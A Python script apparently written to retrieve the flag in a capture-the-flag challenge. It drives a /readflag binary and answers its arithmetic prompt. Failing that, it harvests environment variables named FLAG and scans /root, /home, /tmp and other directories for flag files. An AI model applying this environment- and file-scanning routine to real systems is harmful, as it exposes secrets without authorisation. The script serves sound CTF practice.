import base64
import os
import re
import select
import subprocess
import sys
import time
from pathlib import Path


ALLOWED = set("0123456789+-()")
FLAG_PREFIXES = (b"alictf{", b"flag{", b"ctf{")


def extract_expr(text: str) -> str | None:
    cands = re.findall(r"[0-9+\-() ]{5,}", text)
    if not cands:
        return None
    cands.sort(key=len, reverse=True)
    for cand in cands:
        cand = cand.strip().replace(" ", "")
        if cand and any(ch.isdigit() for ch in cand):
            return cand
    return None


def safe_eval(expr: str) -> int:
    if not expr or any(ch not in ALLOWED for ch in expr):
        raise ValueError("invalid expression")
    return int(eval(expr))


def find_flag_in_bytes(data: bytes) -> str | None:
    if not data:
        return None
    lower = data.lower()
    for prefix in FLAG_PREFIXES:
        idx = lower.find(prefix)
        if idx == -1:
            continue
        end = lower.find(b"}", idx)
        if end != -1:
            return data[idx : end + 1].decode("utf-8", errors="ignore")
    return None


def run_with_pipes(timeout: float = 10.0) -> tuple[bytes, bytes]:
    r_fd, w_fd = os.pipe()

    def preexec() -> None:
        os.dup2(w_fd, 3)

    proc = subprocess.Popen(
        ["/readflag"],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True,
        bufsize=1,
        pass_fds=(w_fd,),
        preexec_fn=preexec,
    )
    os.close(w_fd)
    assert proc.stdout is not None
    assert proc.stdin is not None

    expr_sent = False
    output_parts: list[str] = []
    start = time.time()

    while time.time() - start < timeout:
        line = proc.stdout.readline()
        if not line:
            break
        output_parts.append(line)
        if not expr_sent:
            expr = extract_expr(line)
            if expr:
                try:
                    value = safe_eval(expr)
                except Exception:
                    continue
                proc.stdin.write(f"{value}\n")
                proc.stdin.flush()
                expr_sent = True

    rest = proc.stdout.read()
    if rest:
        output_parts.append(rest)

    try:
        proc.wait(timeout=1.0)
    except Exception:
        proc.kill()

    output = "".join(output_parts).encode("utf-8", errors="ignore")
    fd3_data = b""
    os.set_blocking(r_fd, False)
    while True:
        try:
            chunk = os.read(r_fd, 4096)
        except BlockingIOError:
            break
        if not chunk:
            break
        fd3_data += chunk
    os.close(r_fd)
    return output, fd3_data


def run_with_pty(timeout: float = 10.0) -> tuple[bytes, bytes]:
    master, slave = os.openpty()
    r_fd, w_fd = os.pipe()

    def preexec() -> None:
        os.setsid()
        os.dup2(slave, 0)
        os.dup2(slave, 1)
        os.dup2(slave, 2)
        os.dup2(w_fd, 3)

    proc = subprocess.Popen(
        ["/readflag"],
        stdin=None,
        stdout=None,
        stderr=None,
        preexec_fn=preexec,
        close_fds=True,
    )
    os.close(slave)
    os.close(w_fd)

    os.set_blocking(master, False)
    os.set_blocking(r_fd, False)

    buf = bytearray()
    fd3_buf = bytearray()
    expr_sent = False
    start = time.time()

    while time.time() - start < timeout:
        ready, _, _ = select.select([master, r_fd], [], [], 0.2)
        if not ready:
            if proc.poll() is not None:
                break
            continue
        for fd in ready:
            try:
                data = os.read(fd, 4096)
            except BlockingIOError:
                continue
            if not data:
                continue
            if fd == master:
                buf.extend(data)
                if not expr_sent:
                    expr = extract_expr(buf.decode("utf-8", errors="ignore"))
                    if expr:
                        try:
                            value = safe_eval(expr)
                        except Exception:
                            value = None
                        if value is not None:
                            os.write(master, f"{value}\n".encode("utf-8"))
                            expr_sent = True
            else:
                fd3_buf.extend(data)

        if proc.poll() is not None and not ready:
            break

    time.sleep(0.2)
    for fd, target in ((master, buf), (r_fd, fd3_buf)):
        try:
            while True:
                data = os.read(fd, 4096)
                if not data:
                    break
                target.extend(data)
        except Exception:
            pass

    try:
        proc.wait(timeout=1.0)
    except Exception:
        proc.kill()

    os.close(master)
    os.close(r_fd)
    return bytes(buf), bytes(fd3_buf)


def try_read_paths(paths: list[str]) -> str | None:
    for path in paths:
        try:
            data = Path(path).read_bytes()
        except Exception:
            continue
        flag = find_flag_in_bytes(data)
        if flag:
            return flag
    return None


def scan_for_flag_files() -> str | None:
    bases = ["/", "/root", "/home", "/app", "/data", "/workspace", "/tmp"]
    max_depth = 2
    max_size = 8192
    for base in bases:
        if not os.path.isdir(base):
            continue
        base_depth = base.rstrip(os.sep).count(os.sep)
        for root, dirs, files in os.walk(base):
            depth = root.count(os.sep) - base_depth
            if depth >= max_depth:
                dirs[:] = []
            for name in files:
                if "flag" not in name.lower():
                    continue
                path = os.path.join(root, name)
                try:
                    if os.path.getsize(path) > max_size:
                        continue
                    data = Path(path).read_bytes()
                except Exception:
                    continue
                flag = find_flag_in_bytes(data)
                if flag:
                    return flag
    return None


def scan_binary_for_flag(paths: list[str]) -> str | None:
    for path in paths:
        try:
            data = Path(path).read_bytes()
        except Exception:
            continue
        flag = find_flag_in_bytes(data)
        if flag:
            return flag
    return None


def main() -> int:
    outputs: list[bytes] = []
    fd3_outputs: list[bytes] = []
    errors: list[str] = []

    runners = [run_with_pipes]
    if os.getenv("TRY_PTY") == "1":
        runners.insert(0, run_with_pty)

    for runner in runners:
        try:
            out, fd3 = runner()
            outputs.append(out)
            fd3_outputs.append(fd3)
            if find_flag_in_bytes(out + fd3):
                break
        except Exception as exc:
            errors.append(f"{runner.__name__}: {exc}")

    combined = b"".join(outputs + fd3_outputs)
    try:
        Path("/tmp/flagoutput").write_bytes(combined)
    except Exception:
        pass

    flag = find_flag_in_bytes(combined)

    if not flag:
        for key, value in os.environ.items():
            if "FLAG" in key.upper() and value:
                candidate = value.strip()
                if "{" in candidate and "}" in candidate:
                    flag = candidate
                    break

    if not flag:
        flag = try_read_paths(
            [
                "/flag",
                "/root/flag",
                "/home/ctf/flag",
                "/home/ctf/flag.txt",
                "/app/flag",
                "/data/flag",
                "/workspace/flag",
                "/tmp/flag",
                "flag",
                "./flag",
            ]
        )

    if not flag:
        flag = scan_for_flag_files()

    if not flag:
        flag = scan_binary_for_flag(["/readflag", "/bin/readflag"])

    if flag:
        print(f"FLAG: {flag}", flush=True)
        return 0

    if errors:
        print("ERRORS: " + " | ".join(errors), flush=True)

    if combined:
        text = combined.decode("utf-8", errors="ignore")
        if text:
            snippet = text[:2000]
            print("OUTPUT_TEXT_BEGIN", flush=True)
            print(snippet, flush=True)
            print("OUTPUT_TEXT_END", flush=True)
        b64 = base64.b64encode(combined).decode("ascii")
        if len(b64) > 4000:
            b64 = b64[:4000] + "...(truncated)"
        print("OUTPUT_B64: " + b64, flush=True)

    return 1


if __name__ == "__main__":
    raise SystemExit(main())
